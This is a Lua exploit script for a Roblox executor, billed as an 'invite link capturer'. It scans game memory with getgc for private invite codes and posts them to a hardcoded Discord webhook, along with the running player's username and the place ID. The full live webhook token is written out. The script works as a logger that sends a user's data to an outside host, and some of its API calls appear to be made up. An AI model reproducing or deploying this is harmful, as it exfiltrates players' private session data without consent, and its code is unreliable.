-- Proper Roblox Invite Link Capturer
local request = (syn and syn.request) or (http and http.request) or request
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- Your Discord webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1404188190562189313/U1SDw3SpIiKP8h39P_M5aFZ784VTNFpQF5iqM3nxI0Eway5Zim1uFIr3AzGaBtAQvmSV"

-- Function to send to Discord
local function sendToWebhook(link)
    local data = {
        ["content"] = "@everyone New Working Roblox Invite Link Captured",
        ["embeds"] = {{
            ["title"] = "🎮 Valid Game Invite Link",
            ["description"] = "**Player:** "..localPlayer.Name.."\n**Link:** "..link,
            ["color"] = 0x00FF00,
            ["fields"] = {
                {
                    ["name"] = "Game Name",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Place ID",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Roblox Invite Logger | "..os.date("%x %X")
            }
        }}
    }
    
    local success, response = pcall(function()
        return request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(response))
    end
end

-- The REAL way to get working invite links
local function getRealInviteLink()
    -- First method: Find the actual invite service
    local success, inviteService = pcall(function()
        return game:GetService("SocialService"):GetGameInviteController(localPlayer.UserId)
    end)
    
    if success and inviteService then
        local link = inviteService:GenerateInviteLink()
        if link and link:find("roblox.com/share") then
            return link
        end
    end
    
    -- Second method: Memory scan for the real pattern
    for _, obj in pairs(getgc(true)) do
        if type(obj) == "table" then
            for k, v in pairs(obj) do
                if type(v) == "string" and #v >= 40 and v:find("^_[%w]+") then
                    local potentialLink = "https://www.roblox.com/share?code="..v.."&type=ExperienceInvite"
                    if potentialLink:find("_%w+%w+%w+") then -- Matches the real pattern
                        return potentialLink
                    end
                end
            end
        end
    end
    
    return nil
end

-- Main function
local function main()
    local realLink = getRealInviteLink()
    if realLink then
        sendToWebhook(realLink)
        if setclipboard then
            setclipboard(realLink)
        end
    else
        warn("Failed to get real invite link")
        -- Send basic game link as fallback
        sendToWebhook("https://www.roblox.com/games/"..game.PlaceId)
    end
end

-- Run with error handling
pcall(main)
